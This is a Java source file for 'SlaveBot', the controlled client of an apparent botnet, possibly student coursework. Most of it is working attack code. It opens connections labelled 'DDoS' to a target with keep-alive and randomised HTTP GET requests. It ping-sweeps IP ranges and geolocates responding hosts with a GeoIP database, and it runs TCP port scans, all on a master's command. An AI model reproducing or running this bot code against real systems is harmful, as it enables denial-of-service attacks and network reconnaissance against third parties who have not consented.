import java.net.*;
import java.util.*;
import java.io.*;

import com.maxmind.geoip2.DatabaseReader;
import com.maxmind.geoip2.exception.GeoIp2Exception;
import com.maxmind.geoip2.model.CityResponse;
import com.maxmind.geoip2.record.City;
import com.maxmind.geoip2.record.Country;
import com.maxmind.geoip2.record.Postal;
import com.maxmind.geoip2.record.Subdivision;


public class SlaveBot extends Thread
{
//--variable declarations----------------------------------------------------------------------------------------------------------------------
	static ArrayList<Socket> connectedToRemoteHost = new ArrayList<>();
	static HashMap<String, ArrayList<Socket>> slavetoRemote = new HashMap<String, ArrayList<Socket>>();
	static MasterBot m = new MasterBot();
	Socket DDoS;
	Socket socketSelected;
	Socket portScanSocket;
	static String ipStringRange, portStringRange, target; 
	static boolean isGeo = false;
//--main---------------------------------------------------------------------------------------------------------------------------------------
	public static void main(String[] args) 
	{
		int port = 0;
		String ip = null;
		//for connection done for the first time
		if(args.length != 0)
		{
			//input format example = "java SlaveBot -h localhost -p 9999"
			if (args.length == 4) 
			{
				ip = args[1];
				port = Integer.parseInt(args[3]);
			}
			//input format example = "java SlaveBot -h localhost 9999"
			else if(args.length == 3)
			{
				ip = args[1];
				port = Integer.parseInt(args[2]);
			}
			
			try
			{
				Socket client = new Socket(ip, port);
				System.out.println("> Connected To Server : " + client.getRemoteSocketAddress() + "\n>");
			} catch(IOException e)
			{
				e.printStackTrace();
			}
		}
		//for connection done by the command line
		while(true)
		{
			Scanner reader = new Scanner(System.in);
			String line = reader.nextLine();
			String[] dataArray = line.split("\\s+");
			System.out.print("> ");
			//loop if no data is entered
			if (line.equals("")) 
			{
				continue;
			}
//----------exit function logic
			else if (line.equalsIgnoreCase("exit") || line.equalsIgnoreCase("quit") || line.equalsIgnoreCase("-1"))
			{
				System.out.println("Program Terminated.");
				System.exit(0);
			}
			//input format example = -h localhost -p 9999
			else if(dataArray.length == 4)
			{
				ip = dataArray[1];
				port = Integer.parseInt(dataArray[3]);
			}
			//input format example = -h localhost 9999
			else if(dataArray.length == 3)
			{
				ip = dataArray[1];
				port = Integer.parseInt(dataArray[2]);
			}
//----------for random input format
			else
			{
				continue;
			}
			try
			{
				Socket client = new Socket(ip, port);
				System.out.println("Connected To Server" + client.getRemoteSocketAddress());
			} catch(IOException e)
			{
				e.printStackTrace();
			}
		}
	}
//--connect------------------------------------------------------------------------------------------------------------------------------------
	public HashMap<String, ArrayList<Socket>> connect(Socket selectedSlave, String targetIP, int targetPort, boolean keepAlive, String url) throws IOException
	{
		try
		{
			ArrayList<Socket> socketListForMap = new ArrayList<>();
			DDoS = new Socket();
			DDoS.connect(new InetSocketAddress(targetIP, targetPort));
			if(DDoS.isConnected())
			{
				connectedToRemoteHost.add(DDoS);
				socketListForMap.add(DDoS);
				System.out.println("Client " + selectedSlave.getRemoteSocketAddress() + " connected to " + DDoS.getInetAddress() + " via " + DDoS.getPort());
			}
			// if keep alive is requested from the master
			if (keepAlive) 
			{
				DDoS.setKeepAlive(true);
				System.out.println("keepAlive function is also active for this connection.\n");
			}
			// if url functionality is provided by the master
			if (url != "" && url != null) 
			{
				if(url.length() == 4)
				{
					url = url+getRandomString();
				}
				BufferedWriter bw = new BufferedWriter (new OutputStreamWriter(DDoS.getOutputStream()));
				BufferedReader br = new BufferedReader (new InputStreamReader(DDoS.getInputStream()));
				bw.write("GET " + url + "HTTP/1.1\n\nHost: "+ targetIP);
				bw.flush();
				System.out.println(br.readLine() + " random string used : " + url + "\n");
				bw.close();
				br.close();
			}
			
			for (String key : slavetoRemote.keySet()) 
			{
				if (key.equalsIgnoreCase(selectedSlave.getRemoteSocketAddress().toString())) 
				{
					if (slavetoRemote.containsValue(socketListForMap) || slavetoRemote.get(key) != null) 
					{
						socketListForMap= slavetoRemote.get(key);
					} 
					else 
					{
						socketListForMap = new ArrayList<>();
					}
					socketListForMap.add(DDoS);
				}
			}
			
			slavetoRemote.put(selectedSlave.getRemoteSocketAddress().toString(), socketListForMap);
			
		} catch(IOException e)
		{
			System.out.println("Connection Lost.");
			e.printStackTrace();
		}
		return slavetoRemote;
	}
//--disconnect---------------------------------------------------------------------------------------------------------------------------------
	public void disconnect(Socket selectedSocket, String targetIPAddress, int targetPort) throws IOException
	{
		try
		{
			if (!selectedSocket.isClosed()) 
			{
				System.out.println("Disconnection to " + selectedSocket.toString() + " was successful.");
				selectedSocket.close();
			}
		} catch(IOException e)
		{
			System.out.println("Disconnection Failure.");
			e.printStackTrace();
		}
	}
//--ipScan-------------------------------------------------------------------------------------------------------------------------------------
	public void ipScan(Socket selectedSocket, String ipRangeString, boolean loc) throws IOException
	{
		socketSelected = selectedSocket;
		ipStringRange = ipRangeString;
		isGeo = loc;
		Runnable r1 = new Runnable1();	 
		Thread t1 = new Thread(r1);
		t1.start();
	}
//--tcpPortscan---------------------------------------------------------------------------------------------------------------------------------
	public void tcpPortScan(Socket selectedSocket, String portRangeString, String targetIPAddress) throws IOException
	{
		socketSelected = selectedSocket;
		portStringRange = portRangeString;
		target = targetIPAddress;
		Runnable r2 = new Runnable2();	 
		Thread t2 = new Thread(r2);
		t2.start();
	}
//--getRandomString----------------------------------------------------------------------------------------------------------------------------
	public String getRandomString()
	{
		char[] charStream = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ".toCharArray();
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		for (int i = 0; i < 10; i++) {
		    char c = charStream[random.nextInt(charStream.length)];
		    stringBuilder.append(c);
		}
		String randomString = stringBuilder.toString();
		return randomString;
	}
//--Runnable1 class method for ipscan thread---------------------------------------------------------------------------------------------------
	class Runnable1 implements Runnable
	{
//------run() method for threads---------------------------------------------------------------------------------------------------------------
		public void run()
		{
			try
			{
				ArrayList<String> listOfResponsdedTarget = new ArrayList<String>();
				String[] range = ipStringRange.split("-");
				String[] tupleStart = range[0].split("\\.");
				String[] tupleEnd = range[1].split("\\.");
				long result1 = 0;
				long result2 = 0;
				
				for (int i = 0; i < tupleStart.length; i++) 
				{
					int power = 3 - i;
					int ip = Integer.parseInt(tupleStart[i]);
					result1 += ip * Math.pow(256, power);
				}
				
				for (int i = 0; i < tupleEnd.length; i++) 
				{
					int power = 3 - i;
					int ip = Integer.parseInt(tupleEnd[i]);
					result2 += ip * Math.pow(256, power);
				}
				
				for (long i = result1; i < (result2 + 1); ++i)
				{
					long new_result1 = i;
					String ipString;
					StringBuilder sb = new StringBuilder(15);
					for (int j = 0; j < 4; j++) 
					{
						sb.insert(0,Long.toString(new_result1 & 0xff));
						if (j < 3) 
						{
							sb.insert(0,'.');
						}
						new_result1 = new_result1 >> 8;
					}
					ipString = sb.toString();
					InetAddress ip = InetAddress.getByName(ipString);
					boolean isWindows = System.getProperty("os.name").toLowerCase().contains("win");;
			        String pingResult = "";
			        String pingCmd = "";
			        
			        if (isWindows)
			        {
			        	pingCmd = "ping -n 1 " + ipString;
			        }
			        else
			        {
			        	pingCmd = "ping -c 1 " + ipString;
			        }
			        
			        try 
			        {
			            Runtime r = Runtime.getRuntime();
			            Process p = r.exec(pingCmd);

			            BufferedReader in = new BufferedReader(new InputStreamReader(p.getInputStream()));
			            String inputLine;
			            while ((inputLine = in.readLine()) != null) 
			            {
			                pingResult += inputLine;
			            }
			            in.close();
			            if(isGeo && ( pingResult.contains("0% packet loss") ||pingResult.contains("(0% loss)"))) 
						{
			            	String data;
							File database = new File("GeoLite2-City.mmdb");
							DatabaseReader reader = new DatabaseReader.Builder(database).build();
	                       	CityResponse response = reader.city(ip);
							Country country = response.getCountry();
							Subdivision subdivision = response.getMostSpecificSubdivision();
							City city = response.getCity();
							Postal postal = response.getPostal();
							
							data = ipString + ", Country: " + country.getName() 
							+ ", State: " + subdivision.getName() + ", City: " + city.getName() 
							+ ", Postal Code: " + postal.getCode() + ".";
							
							listOfResponsdedTarget.add(data);
						}
			            if(!isGeo && ( pingResult.contains("0% packet loss") ||pingResult.contains("(0% loss)")))
			            {
			            	listOfResponsdedTarget.add(ipString);
			            }
			        } catch (IOException e) 
			        {
			            System.out.println(e);
			        }
				}		
				m.printIpScan(listOfResponsdedTarget);
			} catch(IOException e)
			{
				System.out.println("ipScan Failure.");
				e.printStackTrace();
			} catch (GeoIp2Exception e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		}
	}
//--Runnable1 class method for tcpportscan thread-----------------------------------------------------------------------------------------------------
	class Runnable2 implements Runnable
	{
//------run() method for threads-----------------------------------------------------------------------------------------------------------------
		public void run()
		{
			ArrayList<String> activePorts = new ArrayList<String>();
			String[] range = portStringRange.split("-");		
			for(int i = Integer.parseInt(range[0]); i < Integer.parseInt(range[1])+1; i++)
			{
				try
				{	
					portScanSocket = new Socket();
					portScanSocket.connect(new InetSocketAddress(target,i), 200);
					activePorts.add(Integer.toString(i));
					portScanSocket.close();
				}catch(IOException e)
				{
				//--empty catch block
				}
			}
			m.printtcpPortScan(activePorts);
		}
	}	
}